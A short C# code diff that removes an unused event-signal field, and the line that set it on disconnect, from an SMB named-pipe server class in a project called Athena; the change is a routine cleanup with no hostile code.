@@ -33,7 +33,6 @@ namespace Athena
         public bool encryptedExchangeCheck = bool.Parse("false");
         private PipeServer<SmbMessage> serverPipe { get; set; }
         public PSKCrypto crypt { get; set; }
-        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
         private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
         private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);
         private CancellationTokenSource cts = new CancellationTokenSource();
@@ -210,7 +209,6 @@ namespace Athena
         {
             Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
             this.connected = false;
-            onEventHappenedSignal.Set(); //Indicate something happened
             onClientConnectedSignal.Reset();
             this.partialMessages.Clear();
         }
